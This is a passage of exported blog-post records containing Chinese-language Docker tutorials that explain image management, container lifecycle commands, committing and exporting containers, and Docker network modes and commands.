rel=\"nofollow\">安装软件下载地址</a></p>\n\n<h1>5.加速器配置</h1>\n\n<p>为什么使用加速器?</p>\n\n<p>配置Docker加速器，将会提升在国内获取Docker官方镜像的速度，否则后面下载镜像的过程会很慢，甚至有可能无法下载镜像 <a href=\"https://help.aliyun.com/document_detail/60750.html?spm=a2c4g.11186623.6.545.OY7haW\" rel=\"nofollow\">配置阿里云加速器的参考教程</a></p>\n\n<h1>6.Docker版本与安装介绍 – 总结</h1>\n\n<h1><img alt=\"\" class=\"has\" height=\"251\" src=\"https://img-blog.csdnimg.cn/20190420154243604.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"683\"></h1>\n\n<p><img alt=\"\" class=\"has\" height=\"437\" src=\"https://img-blog.csdnimg.cn/20190420154302713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"715\"></p>\n\n<p>以上的安装教程的CentOS7和Ubuntu16.04已做亲自测试,有什么问题欢迎大家留意。</p>\n                                    </div>", "log_PostTime": 1584891100, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Docker核心技术之镜像", "log_Intro": "Docker核心技术之镜像", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h2>一、镜像简介</h2>\n\n<p>镜像是一个Docker的可执行文件，其中包括运行应用程序所需的所有代码内容、依赖库、环境变量和配置文件等。 通过镜像可以创建一个或多个容器。</p>\n\n<h2>二、镜像管理</h2>\n\n<p><strong>镜像搜索 - docker search</strong></p>\n\n<p>作用：     搜索Docker Hub(镜像仓库)上的镜像</p>\n\n<p>命令格式：     docker search [OPTIONS] TERM</p>\n\n<p>命令参数(OPTIONS)：     </p>\n\n<p>-f,  --filter filter       根据提供的格式筛选结果         </p>\n\n<p>--format string       利用Go语言的format格式化输出结果         </p>\n\n<p>--limit int           展示最大的结果数，默认25个          --no-trunc            内容全部显示</p>\n\n<p>命令演示：</p>\n\n<p><img alt=\"\" class=\"has\" height=\"314\" src=\"https://img-blog.csdnimg.cn/20190421223232197.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"713\"></p>\n\n<p><strong>镜像查看 - docker images/docker image ls</strong></p>\n\n<p>作用：     列出本地镜像</p>\n\n<p>命令格式：     docker images [OPTIONS] [REPOSITORY[:TAG]]        </p>\n\n<p>                       或者  docker image ls [OPTIONS] [REPOSITORY[:TAG]]</p>\n\n<p>命令参数(OPTIONS)：-a, --all                     展示所有镜像 (默认隐藏底层的镜像)         </p>\n\n<p>                                     --no-trunc                不缩略显示     </p>\n\n<p>                                     -q, --quiet                只显示镜像ID</p>\n\n<p>命令演示：</p>\n\n<p><img alt=\"\" class=\"has\" height=\"162\" src=\"https://img-blog.csdnimg.cn/20190421224155770.png\" width=\"754\"></p>\n\n<p><strong>镜像下载 - docker pull</strong></p>\n\n<p>作用：     下载远程仓库（如Docker Hub）中的镜像</p>\n\n<p>命令格式：     docker pull [OPTIONS] NAME[:TAG|@DIGEST]</p>\n\n<p>命令参数(OPTIONS)：     -a, --all-tags                   下载所有符合给定tag的镜像</p>\n\n<p>命令演示：</p>\n\n<p><img alt=\"\" class=\"has\" height=\"342\" src=\"https://img-blog.csdnimg.cn/20190421224927253.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"717\"></p>\n\n<p><strong>镜像删除 - docker rmi/docker image rm</strong></p>\n\n<p>作用：     将本地的一个或多个镜像删除</p>\n\n<p>命令格式：     docker rmi [OPTIONS] IMAGE [IMAGE...]      或者  docker image rm [OPTIONS] IMAGE [IMAGE...]</p>\n\n<p>命令参数(OPTIONS)：         -f, --force              强制删除</p>\n\n<p>命令演习：</p>\n\n<p><img alt=\"\" class=\"has\" height=\"337\" src=\"https://img-blog.csdnimg.cn/20190421230254162.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"665\"></p>\n\n<p><strong>镜像保存备份 – docker save</strong></p>\n\n<p>作用：     将本地的一个或多个镜像打包保存成本地tar文件(输出到STDOUT)</p>\n\n<p>命令格式：     docker save [OPTIONS] IMAGE [IMAGE...]</p>\n\n<p>命令参数(OPTIONS)：         -o, --output string           指定写入的文件名和路径</p>\n\n<p>命令演示：</p>\n\n<p><img alt=\"\" class=\"has\" height=\"161\" src=\"https://img-blog.csdnimg.cn/20190421231748543.png\" width=\"798\"></p>\n\n<p><strong>镜像备份导入 - docker load</strong></p>\n\n<p>作用：     将save命令打包的镜像导入本地镜像库中</p>\n\n<p>命令格式：     docker load [OPTIONS]</p>\n\n<p>命令参数(OPTIONS)：         -i,  --input string       指定要打入的文件，如没有指定，默认是STDIN     </p>\n\n<p>                                              -q, --quiet                  不打印导入过程信息</p>\n\n<p>命令演示：</p>\n\n<p><img alt=\"\" class=\"has\" height=\"357\" src=\"https://img-blog.csdnimg.cn/20190421232158671.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"678\"></p>\n\n<p><strong>镜像重命名 – docker tag</strong></p>\n\n<p>作用：     对本地镜像的NAME、TAG进行重命名，并新产生一个命名后镜像</p>\n\n<p>命令格式：     docker tag SOURCE_IMAGE[:TAG] TARGET_IMAGE[:TAG]</p>\n\n<p>命令参数(OPTIONS)：         无</p>\n\n<p>命令演示：</p>\n\n<p><img alt=\"\" class=\"has\" height=\"251\" src=\"https://img-blog.csdnimg.cn/20190421232431528.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"795\"></p>\n\n<p><strong>镜像详细信息 – docker image inspect/docker inspect</strong></p>\n\n<p>作用：     查看本地一个或多个镜像的详细信息</p>\n\n<p>命令格式：     docker image inspect [OPTIONS] IMAGE [IMAGE...]       或者 docker inspect [OPTIONS] IMAGE [IMAGE...]</p>\n\n<p>命令参数(OPTIONS)：         -f, --format string          利用特定Go语言的format格式输出结果</p>\n\n<p>命令演示：</p>\n\n<p><img alt=\"\" class=\"has\" height=\"344\" src=\"https://img-blog.csdnimg.cn/2019042123584063.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"785\"></p>\n\n<p><strong>镜像历史信息 – docker history</strong></p>\n\n<p>作用：     查看本地一个镜像的历史(历史分层)信息</p>\n\n<p>命令格式：     docker history [OPTIONS] IMAGE</p>\n\n<p>命令参数(OPTIONS)：     -H, --human        将创建时间、大小进行优化打印(默认为true)     </p>\n\n<p>                                          -q, --quiet               只显示镜像ID         </p>\n\n<p>                                           --no-trunc            不缩略显示</p>\n\n<p>命令演示：</p>\n\n<p><img alt=\"\" class=\"has\" height=\"263\" src=\"https://img-blog.csdnimg.cn/20190422000012188.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"772\"></p>\n\n<h2>三、镜像总结</h2>\n\n<p><img alt=\"\" class=\"has\" height=\"458\" src=\"https://img-blog.csdnimg.cn/20190422000053877.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"594\"></p>\n\n<h2> </h2>\n                                    </div>", "log_PostTime": 1584891102, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Docker核心技术之容器详解", "log_Intro": "Docker核心技术之容器详解", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h2>一、容器简介</h2>\n\n<p>容器（Container）：容器是一种轻量级、可移植、并将应用程序进行的打包的技术，使应用程序可以在几乎任何地方以相同的方式运行 Docker将镜像文件运行起来后，产生的对象就是容器。容器相当于是镜像运行起来的一个实例。 容器具备一定的生命周期。 另外，可以借助docker ps命令查看运行的容器，如同在linux上利用ps命令查看运行着的进程那样。</p>\n\n<h2>二、容器与虚拟机</h2>\n\n<p><strong>Docker容器与虚拟机相同点</strong></p>\n\n<p>容器和虚拟机一样，都会对物理硬件资源进行共享使用。</p>\n\n<p>容器和虚拟机的生命周期比较相似（创建、运行、暂停、关闭等等）。</p>\n\n<p>容器中或虚拟机中都可以安装各种应用，如redis、mysql、nginx等。也就是说，在容器中的操作，如同在一个虚拟机(操作系统)中操作一样。</p>\n\n<p>同虚拟机一样，容器创建后，会存储在宿主机上：linux上位于/var/lib/docker/containers下</p>\n\n<p><strong>Docker容器与虚拟机不同点</strong></p>\n\n<p>注意：容器并不是虚拟机，但它们有很多相似的地方</p>\n\n<p>虚拟机的创建、启动和关闭都是基于一个完整的操作系统。一个虚拟机就是一个完整的操作系统。而容器直接运行在宿主机的内核上，其本质上以一系列进程的结合。</p>\n\n<p>容器是轻量级的，虚拟机是重量级的。首先容器不需要额外的资源来管理(不需要Hypervisor、Guest OS)，虚拟机额外更多的性能消耗；其次创建、启动或关闭容器，如同创建、启动或者关闭进程那么轻松，而创建、启动、关闭一个操作系统就没那么方便了。</p>\n\n<p>也因此，意味着在给定的硬件上能运行更多数量的容器，甚至可以直接把Docker运行在虚拟机上。</p>\n\n<p>                            <img alt=\"\" class=\"has\" height=\"168\" src=\"https://img-blog.csdnimg.cn/20190422235858960.png\" width=\"187\">                <img alt=\"\" class=\"has\" height=\"168\" src=\"https://img-blog.csdnimg.cn/20190422235909971.png\" width=\"187\"></p>\n\n<h2>三、容器的生命周期</h2>\n\n<p><strong>虚拟机的生命周期</strong></p>\n\n<p><img alt=\"\" class=\"has\" height=\"381\" src=\"https://img-blog.csdnimg.cn/2019042300001192.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"712\"></p>\n\n<p><strong>容器的生命周期</strong></p>\n\n<p><img alt=\"\" class=\"has\" height=\"381\" src=\"https://img-blog.csdnimg.cn/2019042300004423.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"674\"></p>\n\n<h2>四、容器的生命周期管理</h2>\n\n<p><strong>容器创建 – docker create</strong></p>\n\n<p>作用：     利用镜像创建出一个Created 状态的待启动容器</p>\n\n<p>命令格式：     docker create [OPTIONS] IMAGE [COMMAND] [ARG...]</p>\n\n<p>命令参数(OPTIONS)：-t, --tty                   分配一个伪TTY，也就是分配虚拟终端         </p>\n\n<p>                                     -i, --interactive        即使没有连接，也要保持STDIN打开                   </p>\n\n<p>                                     --name                  为容器起名，如果没有指定将会随机产生一个名称</p>\n\n<p>命令参数（COMMAND\\ARG）:     COMMAND 表示容器启动后，需要在容器中执行的命令，如ps、ls 等命令     ARG 表示执行 COMMAND 时需要提供的一些参数，如ps 命令的 aux、ls命令的-a等等</p>\n\n<p>命令演示：</p>\n\n<p><img alt=\"\" class=\"has\" height=\"106\" src=\"https://img-blog.csdnimg.cn/20190423000410333.png\" width=\"788\"></p>\n\n<p><strong>容器启动 – docker start</strong></p>\n\n<p>作用：     将一个或多个处于创建状态或关闭状态的容器启动起来</p>\n\n<p>命令格式：     docker start [OPTIONS] CONTAINER [CONTAINER...]</p>\n\n<p>命令参数(OPTIONS)：     -a, --attach        将当前shell的 STDOUT/STDERR 连接到容器上     </p>\n\n<p>                                          -i, --interactive        将当前shell的 STDIN连接到容器上</p>\n\n<p>命令演示：</p>\n\n<p><img alt=\"\" class=\"has\" height=\"114\" src=\"https://img-blog.csdnimg.cn/20190423000529916.png\" width=\"765\"></p>\n\n<p><img alt=\"\" class=\"has\" height=\"127\" src=\"https://img-blog.csdnimg.cn/20190423000539511.png\" width=\"765\"></p>\n\n<p><strong>docker run 与 docker create + docker start</strong></p>\n\n<p>docker run 相当于 docker create + docker start –a       前台模式</p>\n\n<p>docker run -d 相当于 docker create + docker start       后台模式</p>\n\n<p><strong>容器暂停 – docker pause</strong></p>\n\n<p>作用：     暂停一个或多个处于运行状态的容器</p>\n\n<p>命令格式：     docker pause CONTAINER [CONTAINER...]</p>\n\n<p>命令参数(OPTIONS)：     无</p>\n\n<p>命令演示：</p>\n\n<p><img alt=\"\" class=\"has\" height=\"134\" src=\"https://img-blog.csdnimg.cn/20190423000729415.png\" width=\"791\"></p>\n\n<p><strong>容器取消暂停 – docker unpause</strong></p>\n\n<p>作用：     取消一个或多个处于暂停状态的容器，恢复运行</p>\n\n<p>命令格式：     docker unpause CONTAINER [CONTAINER...]</p>\n\n<p>命令参数(OPTIONS)：     无</p>\n\n<p>命令演示：</p>\n\n<p><img alt=\"\" class=\"has\" height=\"138\" src=\"https://img-blog.csdnimg.cn/20190423000829892.png\" width=\"813\"></p>\n\n<p><strong>容器关闭 – docker stop</strong></p>\n\n<p>作用：     关闭一个或多个处于暂停状态或者运行状态的容器</p>\n\n<p>命令格式：     docker stop [OPTIONS] CONTAINER [CONTAINER...]</p>\n\n<p>命令参数(OPTIONS)：     -t, --time int           关闭前，等待的时间，单位秒(默认 10s)</p>\n\n<p>命令演示：</p>\n\n<p><img alt=\"\" class=\"has\" height=\"147\" src=\"https://img-blog.csdnimg.cn/20190423000938630.png\" width=\"800\"></p>\n\n<p><strong>容器终止 – docker kill</strong></p>\n\n<p>作用：     强制并立即关闭一个或多个处于暂停状态或者运行状态的容器</p>\n\n<p>命令格式：     docker kill [OPTIONS] CONTAINER [CONTAINER...]</p>\n\n<p>命令参数(OPTIONS)：     -s, --signal string       指定发送给容器的关闭信号 (默认“KILL”信号)</p>\n\n<p>命令演示：</p>\n\n<p><img alt=\"\" class=\"has\" height=\"154\" src=\"https://img-blog.csdnimg.cn/20190423001128705.png\" width=\"820\"></p>\n\n<p><strong>docker stop和docker kill的区别</strong></p>\n\n<p><strong>前提知识点：</strong></p>\n\n<p>Linux其中两种终止进程的信号是：SIGTERM和SIGKILL</p>\n\n<p>SIGKILL信号：无条件终止进程信号。进程接收到该信号会立即终止，不进行清理和暂存工作。该信号不能被忽略、处理和阻塞，它向系统管理员提供了可以杀死任何进程的方法。</p>\n\n<p>SIGTERM信号：程序终结信号，可以由kill命令产生。与SIGKILL不同的是，SIGTERM信号可以被阻塞和终止，以便程序在退出前可以保存工作或清理临时文件等。</p>\n\n<p>docker stop 会先发出SIGTERM信号给进程，告诉进程即将会被关闭。在-t指定的等待时间过了之后，将会立即发出SIGKILL信号，直接关闭容器。</p>\n\n<p>docker kill 直接发出SIGKILL信号关闭容器。但也可以通过-s参数修改发出的信号。</p>\n\n<p>因此会发现在docker stop的等过过程中，如果终止docker stop的执行，容器最终没有被关闭。而docker kill几乎是立刻发生，无法撤销。</p>\n\n<p>此外还有些异常原因也会导致容器被关闭，比如docker daemon重启、容器内部进程运行发生错误等等“异常原因”。</p>\n\n<p><strong>容器重启 – docker restart</strong></p>\n\n<p>作用：     重启一个或多个处于运行状态、暂停状态、关闭状态或者新建状态的容器     该命令相当于stop和start命令的结合</p>\n\n<p>命令格式：     docker restart [OPTIONS] CONTAINER [CONTAINER...]</p>\n\n<p>命令参数(OPTIONS)：      -t, --time int           重启前，等待的时间，单位秒(默认 10s)                 实则是关闭前等待的时间</p>\n\n<p><strong>容器删除 – docker container rm</strong></p>\n\n<p>作用：     删除一个或多个容器</p>\n\n<p>命令格式：     docker container rm [OPTIONS] CONTAINER [CONTAINER...]       或者 docker rm [OPTIONS] CONTAINER [CONTAINER...]</p>\n\n<p>命令参数(OPTIONS)：      -f, --force             强行删除容器(会使用 SIGKILL信号)     </p>\n\n<p>                                           -v, --volumes           同时删除绑定在容器上的数据卷    </p>\n\n<p>命令演示：</p>\n\n<p><img alt=\"\" class=\"has\" height=\"132\" src=\"https://img-blog.csdnimg.cn/20190423001745229.png\" width=\"789\"></p>\n\n<h2><strong>五、容器信息查看</strong></h2>\n\n<p><strong>容器详细信息 – docker container inspect</strong></p>\n\n<p>作用：     查看本地一个或多个容器的详细信息</p>\n\n<p>命令格式：     docker container inspect [OPTIONS] CONTAINER [CONTAINER...]       或者 docker inspect [OPTIONS] CONTAINER [CONTAINER...]</p>\n\n<p>命令参数(OPTIONS)：         -f, --format string    利用特定Go语言的format格式输出结果     </p>\n\n<p>                                              -s, --size        显示总大小</p>\n\n<p>命令演示：</p>\n\n<p><img alt=\"\" class=\"has\" height=\"375\" src=\"https://img-blog.csdnimg.cn/20190423002048413.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"667\"></p>\n\n<p><strong>容器日志信息 – docker logs</strong></p>\n\n<p>作用：     查看容器的日志信息</p>\n\n<p>命令格式：     docker logs [OPTIONS] CONTAINER</p>\n\n<p>命令参数(OPTIONS)：             --details        显示日志的额外信息     </p>\n\n<p>                                                  -f, --follow                 动态跟踪显示日志信息         </p>\n\n<p>                                                  --since string      只显示某事时间节点之后的              </p>\n\n<p>                                                  --tail string            显示倒数的行数(默认全部)     </p>\n\n<p>                                                  -t, --timestamps         显示timestamps时间         </p>\n\n<p>                                                  --until string       只显示某事时间节点之前的</p>\n\n<p>注意：     容器日志中记录的是容器主进程的输出STDOUT\\STDERR</p>\n\n<p><strong>容器重命名 – docker rename</strong></p>\n\n<p>作用：     修改容器的名称</p>\n\n<p>命令格式：     docker rename CONTAINER NEW_NAME</p>\n\n<p>命令参数(OPTIONS)：         无</p>\n\n<h2>六、容器运行时操作</h2>\n\n<p><strong>容器连接 – docker attach</strong></p>\n\n<p>作用：     将当前终端的STDIN、STDOUT、STDERR绑定到正在运行的容器的主进程上实现连接</p>\n\n<p>命令格式：     docker attach [OPTIONS] CONTAINER</p>\n\n<p>命令参数(OPTIONS)：         --no-stdin                 不绑定STDIN</p>\n\n<p><strong>容器中执行新命令 – docker exec</strong></p>\n\n<p>作用：     在容器中运行一个命令</p>\n\n<p>命令格式：     docker exec [OPTIONS] CONTAINER COMMAND [ARG...]</p>\n\n<p>命令参数(OPTIONS)：         -d, --detach                   后台运行命令     </p>\n\n<p>                                              -i, --interactive        即使没连接容器，也将当前的STDIN绑定上     </p>\n\n<p>                                              -t, --tty                      分配一个虚拟终端     </p>\n\n<p>                                              -w, --workdir string           指定在容器中的工作目录     </p>\n\n<p>                                              -e, --env list                 设置容器中运行时的环境变量</p>\n\n<h2>七、容器总结</h2>\n\n<p><img alt=\"\" class=\"has\" height=\"464\" src=\"https://img-blog.csdnimg.cn/20190423002618448.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"728\"></p>\n\n<p>容器的详解到这结束，后面还有更深入的文章讲解！</p>\n                                    </div>", "log_PostTime": 1584891103, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Docker核心技术之容器与镜像深入了解", "log_Intro": "Docker核心技术之容器与镜像深入了解", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h2>一、Docker 容器与镜像</h2>\n\n<p><strong>Docker容器与镜像的关系</strong></p>\n\n<p>     <img alt=\"\" class=\"has\" height=\"514\" src=\"https://img-blog.csdnimg.cn/20190423230936713.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"657\"></p>\n\n<p><strong>容器提交 – docker commit</strong></p>\n\n<p>作用：     根据容器生成一个新的镜像</p>\n\n<p>命令格式：     docker commit [OPTIONS] CONTAINER [REPOSITORY[:TAG]]</p>\n\n<p>命令参数(OPTIONS)：     -a, --author string        作者     </p>\n\n<p>                                          -c, --change list          为创建的镜像加入Dockerfile命令     </p>\n\n<p>                                          -m, --message string       提交信息，类似git commit -m     </p>\n\n<p>                                           -p, --pause                提交时暂停容器 (default true)</p>\n\n<p>命令演示：</p>\n\n<p><img alt=\"\" class=\"has\" height=\"113\" src=\"https://img-blog.csdnimg.cn/20190423231201844.png\" width=\"795\"><img alt=\"\" class=\"has\" height=\"148\" src=\"https://img-blog.csdnimg.cn/20190423231139161.png\" width=\"795\"></p>\n\n<p><strong>容器导出 – docker export</strong></p>\n\n<p>作用：     将容器当前的文件系统导出成一个tar文件</p>\n\n<p>命令格式：     docker export [OPTIONS] CONTAINER</p>\n\n<p>命令参数(OPTIONS)：     -o, --output string           指定写入的文件，默认是STDOUT    </p>\n\n<p><strong>容器打包的导入 – docker import</strong></p>\n\n<p>作用：     从一个tar文件中导入内容创建一个镜像</p>\n\n<p>命令格式：     docker import [OPTIONS] file|URL|- [REPOSITORY[:TAG]]</p>\n\n<p>命令参数(OPTIONS)：     -c, --change list          为创建的镜像加入Dockerfile命令     </p>\n\n<p>                                          -m, --message string       导入时，添加提交信息</p>\n\n<h2>二、深入理解Docker容器与镜像</h2>\n\n<p><strong>镜像的Layer</strong></p>\n\n<p><img alt=\"\" class=\"has\" height=\"295\" src=\"https://img-blog.csdnimg.cn/20190423231942210.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"406\"></p>\n\n<p><strong>镜像的视角</strong></p>\n\n<p><img alt=\"\" class=\"has\" height=\"198\" src=\"https://img-blog.csdnimg.cn/20190423232037755.png\" width=\"662\"></p>\n\n<p><strong>容器的Layer</strong></p>\n\n<p><img alt=\"\" class=\"has\" height=\"104\" src=\"https://img-blog.csdnimg.cn/20190423232058382.png\" width=\"519\"></p>\n\n<p><img alt=\"\" class=\"has\" height=\"137\" src=\"https://img-blog.csdnimg.cn/20190423232124251.png\" width=\"558\"></p>\n\n<p><strong>容器的视角</strong></p>\n\n<p><img alt=\"\" class=\"has\" height=\"174\" src=\"https://img-blog.csdnimg.cn/20190423232140590.png\" width=\"647\"></p>\n\n<p><strong>容器与镜像的底层关系</strong></p>\n\n<p><img alt=\"\" class=\"has\" height=\"205\" src=\"https://img-blog.csdnimg.cn/20190423232201390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"608\"></p>\n\n<p><strong>容器的运行</strong></p>\n\n<p><img alt=\"\" class=\"has\" height=\"158\" src=\"https://img-blog.csdnimg.cn/20190423232235814.png\" width=\"496\"></p>\n\n<p><img alt=\"\" class=\"has\" height=\"165\" src=\"https://img-blog.csdnimg.cn/20190423232242751.png\" width=\"456\"></p>\n\n<h2>三、总结</h2>\n\n<p><img alt=\"\" class=\"has\" height=\"400\" src=\"https://img-blog.csdnimg.cn/20190423232338617.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"534\"></p>\n                                    </div>", "log_PostTime": 1584891104, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Docker核心技术之网络管理", "log_Intro": "Docker核心技术之网络管理", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h2>一、Docker 网络管理简介</h2>\n\n<p><strong>为什么需要Docker网络管理</strong></p>\n\n<p>容器的网络默认与宿主机、与其他容器都是相互隔离。</p>\n\n<p>容器中可以运行一些网络应用(如nginx、web应用、数据库等)，如果要让外部也可以访问这些容器内运行的网络应用，那么就需要配置网络来实现。</p>\n\n<p>有可能有的需求下，容器不想让它的网络与宿主机、与其他容器隔离。</p>\n\n<p>有可能有的需求下，容器根本不需要网络。</p>\n\n<p>有可能有的需求下，容器需要更高的定制化网络（如定制特殊的集群网络、定制容器间的局域网）。</p>\n\n<p>有可能有的需求下， 容器数量特别多，体量很大的一系列容器的网络管理如何 ……</p>\n\n<p>因此容器的网络管理是非常重要的</p>\n\n<p><strong>Docker中有哪些网络驱动模式</strong></p>\n\n<p>bridge network 模式（网桥）：默认的网络模式。类似虚拟机的nat模式</p>\n\n<p>host network 模式（主机）：容器与宿主机之间的网络无隔离，即容器直接使用宿主机网络</p>\n\n<p>None network 模式：容器禁用所有网络。</p>\n\n<p>Overlay network 模式（覆盖网络）： 利用VXLAN实现的bridge模式</p>\n\n<p>Macvlan network 模式：容器具备Mac地址，使其显示为网络上的物理设备</p>\n\n<p><strong>Docker网络管理命令</strong></p>\n\n<p><strong>查看网络 – docker network ls</strong></p>\n\n<p>作用：     查看已经建立的网络对象</p>\n\n<p>命令格式：     docker network ls [OPTIONS]</p>\n\n<p>命令参数(OPTIONS)：     -f, --filter filter           过滤条件(如 'driver=bridge’)         </p>\n\n<p>                                          --format string       格式化打印结果         </p>\n\n<p>                                          --no-trunc            不缩略显示     </p>\n\n<p>                                          -q, --quiet                   只显示网络对象的ID</p>\n\n<p>注意：     默认情况下，docker安装完成后，会自动创建bridge、host、none三种网络驱动  </p>\n\n<p>命令演示：</p>\n\n<p><img alt=\"\" class=\"has\" height=\"297\" src=\"https://img-blog.csdnimg.cn/20190424230529321.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"774\"></p>\n\n<p><strong> 创建网络 – docker network create</strong></p>\n\n<p>作用：     创建新的网络对象</p>\n\n<p>命令格式：     docker network create [OPTIONS] NETWORK</p>\n\n<p>命令参数(OPTIONS)：     -d, --driver string                指定网络的驱动(默认 \"bridge\")         </p>\n\n<p>                                          --subnet strings               指定子网网段(如192.168.0.0/16、172.88.0.0/24)         </p>\n\n<p>                                          --ip-range strings             执行容器的IP范围，格式同subnet参数         </p>\n\n<p>                                          --gateway strings              子网的IPv4 or IPv6网关，如(192.168.0.1)</p>\n\n<p>注意：     host和none模式网络只能存在一个     docker自带的overlay 网络创建依赖于docker swarm(集群负载均衡)服务     192.168.0.0/16 等于 192.168.0.0~192.168.255.255    192.168.8.0/24     172.88.0.0/24 等于 172.88.0.0~172.88.0.255</p>\n\n<p>命令演示：</p>\n\n<p><img alt=\"\" class=\"has\" height=\"327\" src=\"https://img-blog.csdnimg.cn/20190424231039347.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\" width=\"758\"></p>\n\n<p><strong>网络删除 – docker network rm</strong></p>\n\n<p>作用：     删除一个或多个网络</p>\n\n<p>命令格式：     docker network rm NETWORK [NETWORK...]</p>\n\n<p>命令参数(OPTIONS)：     无</p>\n\n<p><strong>查看网络详细信息 – docker network inspect</strong></p>\n\n<p>作用：     查看一个或多个网络的详细信息</p>\n\n<p>命令格式：     docker network inspect [OPTIONS] NETWORK [NETWORK...]      </p>\n\n<p>                       或者 docker inspect [OPTIONS] NETWORK [NETWORK...]</p>\n\n<p>命令参数(OPTIONS)：     -f, --format string       根据format输出结果</p>\n\n<p><strong>使用网络 – docker run --network</strong></p>\n\n<p>作用：     为启动的容器指定网络模式</p>\n\n<p>命令格式：     docker run/create --network NETWORK</p>\n\n<p>命令参数(OPTIONS)：     无</p>\n\n<p>注意：     默认情况下，docker创建或启动容器时，会默认使用名为bridge的网络</p>\n\n<p><strong>网络连接与断开 – docker network connect/disconnect</strong></p>\n\n<p>作用：     将指定容器与指定网络进行连接或者断开连接</p>\n\n<p>命令格式：     docker network connect [OPTIONS] NETWORK CONTAINER</p>\n\n<p>                       docker network disconnect [OPTIONS] NETWORK CONTAINER</p>\n\n<p>命令参数(OPTIONS)：     -f, --force           强制断开连接(用于disconnect)</p>\n\n<h2>二、Docker网络模式简介</h2>\n\n<p><strong>bridge 网络模式（一）</strong></p>\n\n<p>特点： 宿主机上需要单独的bridge网卡，如默认docker默认创建的docker0。</p>\n\n<p>容器之间、容器与主机之间的网络通信，是借助为每一个容器生成的一对veth 